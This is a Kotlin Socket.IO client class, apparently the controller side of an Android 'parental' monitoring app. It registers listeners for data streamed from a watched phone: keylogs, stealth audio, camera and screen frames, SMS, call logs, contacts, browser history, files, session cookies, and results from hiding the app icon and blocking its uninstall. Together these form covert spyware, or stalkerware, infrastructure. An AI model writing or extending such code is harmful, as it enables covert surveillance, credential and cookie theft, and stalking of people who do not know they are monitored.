package com.tether.parent.network

import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import io.socket.emitter.Emitter
import org.json.JSONObject
import java.net.URI

class SocketManager {
    companion object {
        private const val TAG = "SocketManager"
        private var instance: SocketManager? = null

        fun getInstance(): SocketManager {
            if (instance == null) {
                instance = SocketManager()
            }
            return instance!!
        }
    }

    private var socket: Socket? = null
    private var isConnected = false
    private val eventListeners = mutableMapOf<String, MutableList<(JSONObject) -> Unit>>()

    fun connect(serverUrl: String, token: String) {
        try {
            val options = IO.Options().apply {
                forceNew = true
                reconnection = true
                reconnectionAttempts = 10
                reconnectionDelay = 2000
                timeout = 10000
                auth = mapOf("token" to token)
            }

            socket = IO.socket(URI.create(serverUrl), options)

            socket?.on(Socket.EVENT_CONNECT) {
                isConnected = true
                Log.d(TAG, "Connected to server")
                emitEvent("socket:connected", JSONObject().apply { put("status", "connected") })
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                isConnected = false
                Log.d(TAG, "Disconnected from server")
                emitEvent("socket:disconnected", JSONObject().apply { put("status", "disconnected") })
            }

            socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
                Log.e(TAG, "Connection error: ${args.firstOrNull()}")
                emitEvent("socket:error", JSONObject().apply { put("error", args.firstOrNull()?.toString() ?: "Unknown error") })
            }

            // ====== Register ALL server event listeners ======
            registerListeners()
            socket?.connect()
        } catch (e: Exception) {
            Log.e(TAG, "Error connecting socket: ${e.message}")
        }
    }

    private fun registerListeners() {
        // Core
        register("auth:ok")
        register("auth:error")

        // User presence
        register("user:online")
        register("user:offline")

        // Location
        register("location:updated")
        register("location:request")

        // SOS / Check-in
        register("sos:alert")
        register("sos:trigger")
        register("checkin:received")
        register("geofence:breach")

        // Screen
        register("screen:lock:sent")
        register("screen:capture:result")
        register("screen:view:frame")
        register("screen:recording:chunk")
        register("screen:recording:done")

        // Camera
        register("camera:frame")
        register("camera:stopped")
        // camera:burst:frame DIHAPUS (fitur BURST dihapus)

        // Voice / Audio
        register("voice:frame")
        register("voice:error")
        register("audio:stealth:frame")
        register("audio:stealth:stopped")

        // App usage / Keylog / Clipboard / Battery
        register("app:usage:updated")
        register("keylog:event")
        register("clipboard:data")
        register("battery:data")
        register("notification:event")

        // SMS / Call / Contacts / SIM
        register("sms:data")
        register("call:data")
        register("contacts:data")
        register("sim:data")

        // Browser / Files / Media
        register("browser:history")
        register("file:data")
        register("file:list:result")
        register("file:read:result")
        register("file:delete:result")
        register("media:data")
        register("media:list:result")
        register("media:file:result")

        // Network
        register("network:data")

        // Shell DIHAPUS - fitur butuh root

        // Session
        register("session:cookies:data")
        register("session:request-cookies")

        // Device info
        register("device:info:data")

        // Blocklist
        register("blocklist:sync:result")
        register("blocklist:block")
        register("blocklist:unblock")

        // Notifications
        register("notification")

        // Flashlight
        register("flashlight:status")
        register("flashlight:on")
        register("flashlight:off")

        // Command result / admin
        register("device:command:result")
        register("device:admin:status")
        register("command:error")

        // Anti-uninstall / security
        register("icon:hidden:result")
        register("uninstall:block:result")
        register("package:event")
        register("security:alert")
        register("pin:verified:result")

        // General
        register("error")
    }

    private fun register(event: String) {
        socket?.on(event) { args -> emitFromSocket(event, args) }
    }

    private fun emitFromSocket(event: String, args: Array<Any?>) {
        try {
            val data = args.firstOrNull() as? JSONObject
            if (data != null) emitEvent(event, data)
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing $event: ${e.message}")
        }
    }

    fun authenticate(userId: String, role: String, familyCode: String, name: String) {
        emit("auth", JSONObject().apply {
            put("userId", userId)
            put("role", role)
            put("familyCode", familyCode)
            put("name", name)
        })
    }

    fun disconnect() {
        socket?.disconnect()
        socket?.off()
        isConnected = false
    }

    fun emit(event: String, data: JSONObject) {
        socket?.emit(event, data)
    }

    fun addEventListener(event: String, listener: (JSONObject) -> Unit) {
        eventListeners.getOrPut(event) { mutableListOf() }.add(listener)
    }

    fun removeEventListener(event: String, listener: (JSONObject) -> Unit) {
        eventListeners[event]?.remove(listener)
    }

    private fun emitEvent(event: String, data: JSONObject) {
        eventListeners[event]?.forEach { listener ->
            try { listener(data) } catch (e: Exception) { Log.e(TAG, "Listener error for $event: ${e.message}") }
        }
    }

    fun isSocketConnected(): Boolean = isConnected
}
